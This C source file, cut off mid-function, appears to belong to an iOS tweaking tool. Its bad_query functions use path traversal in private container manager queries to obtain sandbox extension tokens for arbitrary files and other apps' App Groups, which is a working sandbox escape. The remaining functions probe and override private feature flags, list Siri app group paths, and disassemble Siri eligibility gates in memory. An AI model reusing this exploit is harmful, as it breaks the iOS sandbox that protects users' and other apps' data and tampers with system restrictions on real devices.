//
//  bad_query.c
//  bad_query
//
//  Created by Taj C on 7/21/26.
//

#include "bad_query.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <limits.h>
#include <sys/stat.h>
#include <dirent.h>
#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>
#include <notify.h>
#include <dispatch/dispatch.h>
#include <objc/runtime.h>
#include <objc/message.h>
#if __has_include(<ptrauth.h>)
#include <ptrauth.h>
#endif

#include <sys/mount.h>
#include <sys/fsgetpath.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
    // Sanity check our path and check if something already exists there
    if (!path || path[0] != '/') return -255; // Not an absolute path
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254; // File is missing, so we'll return
    }
    
    // Now the fun begins
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1; // Failed to dlopen
    
    // Resolve functions
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    
    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1; // Failed to resolve a function
    }
    
    // Create query
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2; // Failed to create query
    }
    
    // Set up query
    // Two routes here, supply an App Group you control (to access other App Groups on iOS 26) or don't, and use MobileGestalt's SystemGroup as a target instead. If targeting iOS 26 and trying to access App Groups, also set is_group to true to use the correct flags.
    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7); // Class 7 (MCMSharedDataContainer) routes to containermanagerd
        identifier = xpc_string_create(group_identifier);
    }
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // Part determines our starting point, part 3 is Library/Caches
    char *part = NULL;
    // Oldest trick in the book. Basic path traversal.
    if (group_identifier == NULL) {
        if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5; // asprintf failed for some reason
        }
    } else {
        // We have to go one level higher to get to / from an App Group
        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5; // Same thing
        }
    }
    
    // To access App Groups on iOS 26, you have to use different flags, this doesn't apply on 27
    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Send our query over
    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3; // Outside of sandbox
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4; // Kernel refused to issue a sandbox extension
    }
    
    // Consume our fresh sandbox extension and clean up
    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    
    dlclose(mgr);
    return handle;
}

int64_t bad_query_ex(char* path, bool create, char *group_identifier, uint64_t container_class) {
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return -2; }

    query_set_class(query, container_class);
    xpc_object_t identifier = xpc_string_create(group_identifier);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    // depth of traversal depends on container class path depth
    char *part = NULL;
    if (asprintf(&part, "../../../../../../../../..%s", path) == -1) {
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -5;
    }
    query_set_part_domain(query, part);
    query_set_flags(query, 0x0000008000000000ULL);

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    dlclose(mgr);
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

// MobileGestalt direct API - reads values from the running MobileGestaltHelper daemon
// This tells us what the system ACTUALLY sees, not just what's in the plist
typedef void *(*MGCopyAnswerFn)(const void *);
typedef bool (*MGGetBoolAnswerFn)(const void *);

void *mg_copy_answer(const char *key) {
    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mg) return NULL;
    MGCopyAnswerFn fn = (MGCopyAnswerFn)dlsym(mg, "MGCopyAnswer");
    if (!fn) { dlclose(mg); return NULL; }
    // Create CFString from C string
    CFStringRef cfKey = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    if (!cfKey) { dlclose(mg); return NULL; }
    void *result = fn(cfKey);
    CFRelease(cfKey);
    dlclose(mg);
    return result; // caller must CFRelease
}

bool mg_get_bool_answer(const char *key) {
    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mg) return false;
    MGGetBoolAnswerFn fn = (MGGetBoolAnswerFn)dlsym(mg, "MGGetBoolAnswer");
    if (!fn) { dlclose(mg); return false; }
    CFStringRef cfKey = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    if (!cfKey) { dlclose(mg); return false; }
    bool result = fn(cfKey);
    CFRelease(cfKey);
    dlclose(mg);
    return result;
}

void mg_notify_cache_changed(void) {
    notify_post("com.apple.MobileGestalt.cache-changed");
}

void post_darwin_notification(const char *name) {
    notify_post(name);
}

char *probe_private_apis(void) {
    size_t cap = 8192;
    char *out = malloc(cap);
    if (!out) return NULL;
    size_t len = 0;

    void *ff = dlopen("/usr/lib/libFeatureFlags.dylib", RTLD_LAZY);
    if (!ff) ff = dlopen("/System/Library/PrivateFrameworks/FeatureFlags.framework/FeatureFlags", RTLD_LAZY);
    if (ff) {
        len += snprintf(out + len, cap - len, "FF:loaded\n");
        const char *syms[] = {
            "_os_feature_enabled_impl",
            "_os_feature_enabled_simple_impl",
            "_os_feature_flag_get_enabled_value",
            "os_feature_flag_override_set_bool",
            "_os_feature_flag_override_set_bool",
            "_os_feature_flag_override_set",
            "os_feature_flag_set_override",
            "_os_feature_flag_set_override",
            "_os_feature_flag_override_get",
            "_os_feature_flag_override_remove",
            "_os_feature_flag_value_impl",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            if (dlsym(ff, syms[i]))
                len += snprintf(out + len, cap - len, "FF:FOUND:%s\n", syms[i]);
        }
        dlclose(ff);
    } else {
        len += snprintf(out + len, cap - len, "FF:not_loaded:%s\n", dlerror() ? dlerror() : "unknown");
    }

    void *el = NULL;
    const char *el_paths[] = {
        "/System/Library/PrivateFrameworks/EligibilityCore.framework/EligibilityCore",
        "/System/Library/PrivateFrameworks/OSEligibility.framework/OSEligibility",
        "/usr/lib/libos_eligibility.dylib",
        NULL
    };
    for (int i = 0; el_paths[i] && !el; i++)
        el = dlopen(el_paths[i], RTLD_LAZY);
    if (el) {
        len += snprintf(out + len, cap - len, "EL:loaded\n");
        const char *syms[] = {
            "os_eligibility_check_domain",
            "os_eligibility_check_domain_v2",
            "os_eligibility_get_domain_answer",
            "os_eligibility_set_domain_answer",
            "os_eligibility_domain_set_input",
            "os_eligibility_set_input",
            "_os_eligibility_get_internal_state",
            "os_eligibility_copy_answer",
            "os_eligibility_copy_inputs_for_domain",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            if (dlsym(el, syms[i]))
                len += snprintf(out + len, cap - len, "EL:FOUND:%s\n", syms[i]);
        }
        dlclose(el);
    } else {
        len += snprintf(out + len, cap - len, "EL:not_loaded\n");
    }

    return out;
}

int ff_try_set(const char *subsystem, const char *flag, bool value) {
    void *ff = dlopen("/usr/lib/libFeatureFlags.dylib", RTLD_LAZY);
    if (!ff) ff = dlopen("/System/Library/PrivateFrameworks/FeatureFlags.framework/FeatureFlags", RTLD_LAZY);
    if (!ff) return -1;

    typedef void (*set3_fn)(const char *, const char *, bool);
    const char *names[] = {
        "os_feature_flag_override_set_bool",
        "_os_feature_flag_override_set_bool",
        "_os_feature_flag_override_set",
        "os_feature_flag_set_override",
        "_os_feature_flag_set_override",
        NULL
    };

    int result = -2;
    for (int i = 0; names[i]; i++) {
        set3_fn f = (set3_fn)dlsym(ff, names[i]);
        if (f) {
            f(subsystem, flag, value);
            result = 0;
            break;
        }
    }

    dlclose(ff);
    return result;
}

int ff_check(const char *subsystem, const char *flag) {
    void *ff = dlopen("/usr/lib/libFeatureFlags.dylib", RTLD_LAZY);
    if (!ff) ff = dlopen("/System/Library/PrivateFrameworks/FeatureFlags.framework/FeatureFlags", RTLD_LAZY);
    if (!ff) return -1;

    // Open-source WebKit declares the private SPI as:
    // bool _os_feature_enabled_impl(const char *domain, const char *feature);
    typedef bool (*check_fn)(const char *, const char *);

    void *sym = dlsym(ff, "_os_feature_enabled_impl");
    if (!sym) sym = dlsym(ff, "_os_feature_enabled_simple_impl");

    int result = -2;
    if (sym) {
        result = ((check_fn)sym)(subsystem, flag) ? 1 : 0;
    }

    dlclose(ff);
    return result;
}

char *siri_gate_probe(void) {
    const char *assistant_paths[] = {
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        NULL
    };
    const char *assistant_symbols[] = {
        "AFDeviceSupportsSystemAssistantExperience",
        "AFDeviceSupportsSAEByDeviceCapabilityAndFeatureFlags",
        "AFLocaleSupportsSAE",
        "AFDeviceSupportsSAE",
        "AFHasGMSCapability",
        "AFHasGMSCapabilityUnembargoed",
        "AFDeviceSupportsSiriUOD",
        "AFUODStatusSupportedFull",
        NULL
    };
    const char *mg_symbols[] = {
        "_MobileGestalt_get_deviceSupportsSiriUnderstandingOnDevice",
        "MobileGestalt_get_deviceSupportsSiriUnderstandingOnDevice",
        NULL
    };
    const char *ff_domains[][2] = {
        { "Siri", "sae_override" },
        { "Siri", "assistant_engine_override" },
        { "Siri", "assistant_engine" },
        { "Siri", "force_uod_enabled_for_device" },
        { "SiriUI", "sae" },
        { "SiriUI", "sae_use_container" },
        { "SiriNL", "NLRouter" },
        { "GenerativeModels", "GenerativeModelsAvailability" },
        { "IntelligenceFlow", "IntelligenceFlow" },
        { NULL, NULL }
    };

    size_t cap = 8192;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = NULL;
    for (int i = 0; assistant_paths[i] && !assistant; i++)
        assistant = dlopen(assistant_paths[i], RTLD_NOW | RTLD_LOCAL);

    len += snprintf(out + len, cap - len, "[AssistantServices] loaded=%d\n", assistant != NULL);
    if (assistant) {
        for (int i = 0; assistant_symbols[i]; i++) {
            void *symbol = dlsym(assistant, assistant_symbols[i]);
            len += snprintf(out + len, cap - len, "%s=%s\n", assistant_symbols[i],
                            symbol ? "PRESENT_NOT_CALLED" : "NO_SYMBOL");
        }
        dlclose(assistant);
    }

    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    len += snprintf(out + len, cap - len, "[MobileGestalt Siri UOD]\n");
    if (mg) {
        for (int i = 0; mg_symbols[i]; i++) {
            void *symbol = dlsym(mg, mg_symbols[i]);
            len += snprintf(out + len, cap - len, "%s=%s\n", mg_symbols[i],
                            symbol ? "PRESENT_NOT_CALLED" : "NO_SYMBOL");
        }
        dlclose(mg);
    } else {
        len += snprintf(out + len, cap - len, "library=NOT_LOADED\n");
    }

    len += snprintf(out + len, cap - len, "[FeatureFlags]\n");
    for (int i = 0; ff_domains[i][0]; i++) {
        int value = ff_check(ff_domains[i][0], ff_domains[i][1]);
        len += snprintf(out + len, cap - len, "%s.%s=%d\n",
                        ff_domains[i][0], ff_domains[i][1], value);
    }

    return out;
}

char *siri_group_probe(void) {
    const char *group_ids[] = {
        "group.com.apple.assistant.shared",
        "group.com.apple.assistant.shared.backedup",
        "group.com.apple.siri.ASR.shared",
        "group.com.apple.siri.recorded-audio",
        "group.com.apple.siri.referenceResolution",
        "group.com.apple.siri.inference",
        "group.com.apple.siri.sirisuggestions",
        "group.com.apple.siri.userfeedbacklearning",
        "group.com.apple.siri.remembers",
        "group.com.apple.siri.GMSSELFIngestor",
        NULL
    };

    size_t cap = 16384;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        snprintf(out, cap, "containermanager=NOT_LOADED\n");
        return out;
    }

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    typedef char *(*container_copy_path_fn)(void *, uint64_t *);
    container_copy_path_fn copy_path = (container_copy_path_fn)dlsym(mgr, "container_copy_path");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_get_single_result ||
        !query_free || !copy_path) {
        snprintf(out, cap, "containermanager=SYMBOLS_MISSING\n");
        dlclose(mgr);
        return out;
    }

    for (int i = 0; group_ids[i]; i++) {
        void *query = query_create();
        if (!query) {
            len += snprintf(out + len, cap - len, "%s=QUERY_CREATE_FAILED\n", group_ids[i]);
            continue;
        }

        query_set_class(query, 7); // MCMSharedDataContainer / app group
        xpc_object_t identifier = xpc_string_create(group_ids[i]);
        query_set_group_identifiers(query, identifier);
        query_set_part(query, 3); // known-valid Library/Caches part; copy_path still returns container root
        query_set_flags(query, 0x0000000800000000ULL);

        void *result = query_get_single_result(query);
        if (!result) {
            len += snprintf(out + len, cap - len, "%s=NO_RESULT\n", group_ids[i]);
        } else {
            uint64_t error = 0;
            char *path = copy_path(result, &error);
            if (path) {
                len += snprintf(out + len, cap - len, "%s=PATH:%s\n", group_ids[i], path);
                free(path);
            } else {
                len += snprintf(out + len, cap - len, "%s=PATH_ERROR:%llu\n",
                                group_ids[i], (unsigned long long)error);
            }
        }

        xpc_release(identifier);
        query_free(query);
    }

    dlclose(mgr);
    return out;
}

int siri_gate_call_confirmed(int gate_index) {
    // Callsites recovered from iOS 26.1 invoke these exports with no arguments.
    // Keep each invocation isolated so an exact-build behavioral failure cannot
    // hide the result of another gate, as happened in v10's batch probe.
    const char *symbols[] = {
        "AFDeviceSupportsSystemAssistantExperience",
        "AFDeviceSupportsSAEByDeviceCapabilityAndFeatureFlags",
        "AFDeviceSupportsSAE",
        "AFDeviceSupportsSiriUOD",
        "AFHasGMSCapabilityUnembargoed",
        "AFLocaleSupportsSAE",
        "AFDeviceSupportsSAEDeprecated",
    };
    if (gate_index < 0 || gate_index >= 7) return -1;

    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) return -2;

    typedef bool (*confirmed_bool_noargs_fn)(void);
    confirmed_bool_noargs_fn fn =
        (confirmed_bool_noargs_fn)dlsym(assistant, symbols[gate_index]);
    if (!fn) {
        dlclose(assistant);
        return -3;
    }

    int result = fn() ? 1 : 0;
    dlclose(assistant);
    return result;
}

char *siri_gate_code_dump(void) {
    const char *symbols[] = {
        "AFDeviceSupportsSAE",
        "AFDeviceSupportsSystemAssistantExperience",
        NULL
    };
    const size_t bytes_per_symbol = 256;
    const size_t cap = 16384;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;

    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }

    for (int i = 0; symbols[i]; i++) {
        void *symbol = dlsym(assistant, symbols[i]);
        if (!symbol) {
            len += snprintf(out + len, cap - len, "%s=NO_SYMBOL\n", symbols[i]);
            continue;
        }

        void *code = symbol;
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
        code = ptrauth_strip(symbol, ptrauth_key_function_pointer);
#endif
        Dl_info info = {0};
        dladdr(code, &info);
        uintptr_t address = (uintptr_t)code;
        uintptr_t base = (uintptr_t)info.dli_fbase;
        len += snprintf(out + len, cap - len,
                        "[%s] image=%s address=0x%llx imageOffset=0x%llx\n",
                        symbols[i], info.dli_fname ? info.dli_fname : "?",
                        (unsigned long long)address,
                        (unsigned long long)(base ? address - base : 0));

        const unsigned char *p = (const unsigned char *)code;
        for (size_t offset = 0; offset < bytes_per_symbol && len + 80 < cap; offset += 16) {
            len += snprintf(out + len, cap - len, "%04llx:",
                            (unsigned long long)offset);
            for (size_t j = 0; j < 16; j++) {
                len += snprintf(out + len, cap - len, "%02x", p[offset + j]);
            }
            len += snprintf(out + len, cap - len, "\n");
        }
    }

    dlclose(assistant);
    return out;
}

char *siri_gate_target_dump(void) {
    const char *symbols[] = {
        "AFDeviceSupportsSAE",
        "AFDeviceSupportsSystemAssistantExperience",
        NULL
    };
    const size_t cap = 65536;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;

    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }

    for (int i = 0; symbols[i]; i++) {
        void *symbol = dlsym(assistant, symbols[i]);
        if (!symbol) continue;
        void *code = symbol;
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
        code = ptrauth_strip(symbol, ptrauth_key_function_pointer);
#endif
        uintptr_t start = (uintptr_t)code;
        const uint32_t *instructions = (const uint32_t *)code;
        len += snprintf(out + len, cap - len, "[%s] stub=0x%llx\n",
                        symbols[i], (unsigned long long)start);

        for (size_t n = 0; n < 28; n++) {
            uint32_t instruction = instructions[n];
            if ((instruction & 0xFC000000U) != 0x14000000U) continue; // B imm26 only
            int64_t immediate = (int64_t)(instruction & 0x03FFFFFFU);
            if (immediate & 0x02000000LL) immediate |= ~0x03FFFFFFLL;
            uintptr_t source = start + n * 4;
            uintptr_t target = (uintptr_t)((int64_t)source + (immediate << 2));
            if (target >= start && target < start + 0x100) continue;

            Dl_info info = {0};
            dladdr((void *)target, &info);
            len += snprintf(out + len, cap - len,
                            "branch@+0x%llx target=0x%llx image=%s nearest=%s symbolOffset=0x%llx\n",
                            (unsigned long long)(n * 4),
                            (unsigned long long)target,
                            info.dli_fname ? info.dli_fname : "?",
                            info.dli_sname ? info.dli_sname : "?",
                            (unsigned long long)(info.dli_saddr ? target - (uintptr_t)info.dli_saddr : 0));
            const unsigned char *p = (const unsigned char *)target;
            for (size_t offset = 0; offset < 512 && len + 80 < cap; offset += 16) {
                len += snprintf(out + len, cap - len, "%04llx:",
                                (unsigned long long)offset);
                for (size_t j = 0; j < 16; j++)
                    len += snprintf(out + len, cap - len, "%02x", p[offset + j]);
                len += snprintf(out + len, cap - len, "\n");
            }
        }
    }

    dlclose(assistant);
    return out;
}

static uintptr_t decode_adrp_target(uintptr_t pc, uint32_t instruction) {
    int64_t imm = (int64_t)(((instruction >> 29) & 0x3) |
                            (((instruction >> 5) & 0x7FFFF) << 2));
    if (imm & (1LL << 20)) imm |= ~((1LL << 21) - 1);
    return (uintptr_t)((int64_t)(pc & ~(uintptr_t)0xFFF) + (imm << 12));
}

char *siri_gate_selector_probe(void) {
    const char *symbols[] = {
        "AFDeviceSupportsSAE",
        "AFDeviceSupportsSystemAssistantExperience",
        NULL
    };
    char *out = calloc(1, 8192);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, 8192, "AssistantServices=NOT_LOADED\n");
        return out;
    }

    for (int i = 0; symbols[i]; i++) {
        void *symbol = dlsym(assistant, symbols[i]);
        if (!symbol) continue;
        void *code = symbol;
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
        code = ptrauth_strip(symbol, ptrauth_key_function_pointer);
#endif
        uintptr_t start = (uintptr_t)code;
        const uint32_t *ins = (const uint32_t *)code;

        // The active path loads an Objective-C receiver via ADRP/LDR at +0x30
        // and tail-branches at +0x44 to an objc_msgSend$selector stub.
        uintptr_t got_page = decode_adrp_target(start + 0x30, ins[12]);
        uint64_t ldr_offset = ((ins[13] >> 10) & 0xFFF) << 3;
        void *receiver = *(void **)(got_page + ldr_offset);

        uint32_t branch = ins[17];
        int64_t branch_imm = (int64_t)(branch & 0x03FFFFFFU);
        if (branch_imm & 0x02000000LL) branch_imm |= ~0x03FFFFFFLL;
        uintptr_t selector_stub = start + 0x44 + (branch_imm << 2);
        const uint32_t *stub = (const uint32_t *)selector_stub;
        uintptr_t selector_page = decode_adrp_target(selector_stub, stub[0]);
        uint64_t add_imm = (stub[1] >> 10) & 0xFFF;
        if ((stub[1] >> 22) & 1) add_imm <<= 12;
        const char *selector_name = (const char *)(selector_page + add_imm);

        const char *receiver_class = receiver ? object_getClassName((id)receiver) : NULL;
        len += snprintf(out + len, 8192 - len,
                        "%s receiver=%s selector=%s\n",
                        symbols[i], receiver_class ? receiver_class : "?",
                        selector_name ? selector_name : "?");
    }
    dlclose(assistant);
    return out;
}

char *siri_deprecated_dependency_probe(void) {
    char *out = calloc(1, 16384);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, 16384, "AssistantServices=NOT_LOADED\n");
        return out;
    }

    void *symbol = dlsym(assistant, "AFDeviceSupportsSAEDeprecated");
    if (!symbol) {
        snprintf(out, 16384, "AFDeviceSupportsSAEDeprecated=NO_SYMBOL\n");
        dlclose(assistant);
        return out;
    }
    void *code = symbol;
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
    code = ptrauth_strip(symbol, ptrauth_key_function_pointer);
#endif
    uintptr_t start = (uintptr_t)code;
    const uint32_t *ins = (const uint32_t *)code;
    len += snprintf(out + len, 16384 - len,
                    "AFDeviceSupportsSAEDeprecated=AND(dependency1,dependency2,dependency3)\n");

    int dependency = 0;
    for (size_t n = 0; n < 40; n++) {
        uint32_t instruction = ins[n];
        if ((instruction & 0xFC000000U) != 0x94000000U) continue; // BL imm26
        int64_t immediate = (int64_t)(instruction & 0x03FFFFFFU);
        if (immediate & 0x02000000LL) immediate |= ~0x03FFFFFFLL;
        uintptr_t source = start + n * 4;
        uintptr_t target = (uintptr_t)((int64_t)source + (immediate << 2));
        Dl_info info = {0};
        dladdr((void *)target, &info);
        dependency++;
        len += snprintf(out + len, 16384 - len,
                        "dependency%d target=0x%llx nearest=%s symbolOffset=0x%llx\n",
                        dependency, (unsigned long long)target,
                        info.dli_sname ? info.dli_sname : "?",
                        (unsigned long long)(info.dli_saddr ? target - (uintptr_t)info.dli_saddr : 0));
        if (dependency == 3) break; // the following calls are logging only
    }

    // In 24A5390f the third dependency receives a static C string in x0.
    uintptr_t string_page = decode_adrp_target(start + 0x2c, ins[11]);
    uint64_t add_imm = (ins[12] >> 10) & 0xFFF;
    if ((ins[12] >> 22) & 1) add_imm <<= 12;
    const char *argument = (const char *)(string_page + add_imm);
    len += snprintf(out + len, 16384 - len, "dependency3.argument=%s\n",
                    argument ? argument : "?");

    dlclose(assistant);
    return out;
}

char *siri_refresh_sae_cache(void) {
    char *out = calloc(1, 4096);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, 4096, "AssistantServices=NOT_LOADED\n");
        return out;
    }

    typedef bool (*bool_noargs_fn)(void);
    bool_noargs_fn device_gate = (bool_noargs_fn)dlsym(assistant, "AFDeviceSupportsSAE");
    bool_noargs_fn system_gate =
        (bool_noargs_fn)dlsym(assistant, "AFDeviceSupportsSystemAssistantExperience");
    len += snprintf(out + len, 4096 - len, "before DeviceSupportsSAE=%d SystemExperience=%d\n",
                    device_gate ? device_gate() : -1,
                    system_gate ? system_gate() : -1);

    Class manager_class = objc_getClass("AFSystemAssistantExperienceStatusManager");
    SEL shared_selector = sel_registerName("sharedManager");
    SEL refresh_selector = sel_registerName("fetchGenerativeModelsAvailability");
    if (!manager_class || !class_respondsToSelector(object_getClass(manager_class), shared_selector)) {
        len += snprintf(out + len, 4096 - len, "manager=NOT_AVAILABLE\n");
    } else {
        id manager = ((id (*)(id, SEL))objc_msgSend)((id)manager_class, shared_selector);
        if (manager && class_respondsToSelector(object_getClass(manager), refresh_selector)) {
            ((void (*)(id, SEL))objc_msgSend)(manager, refresh_selector);
            len += snprintf(out + len, 4096 - len, "fetchGenerativeModelsAvailability=CALLED\n");
        } else {
            len += snprintf(out + len, 4096 - len, "refreshSelector=NOT_AVAILABLE\n");
        }
    }

    const char *notifications[] = {
        "com.apple.siri.orchestration.capabilities.didChange",
        "com.apple.gms.availability.notification",
        "com.apple.os-eligibility-domain.change.greymatter",
        NULL
    };
    for (int i = 0; notifications[i]; i++) {
        int status = notify_post(notifications[i]);
        len += snprintf(out + len, 4096 - len, "notify %s=%d\n", notifications[i], status);
    }

    len += snprintf(out + len, 4096 - len, "after DeviceSupportsSAE=%d SystemExperience=%d\n",
                    device_gate ? device_gate() : -1,
                    system_gate ? system_gate() : -1);
    dlclose(assistant);
    return out;
}

char *siri_refresh_method_dump(void) {
    const size_t cap = 65536;
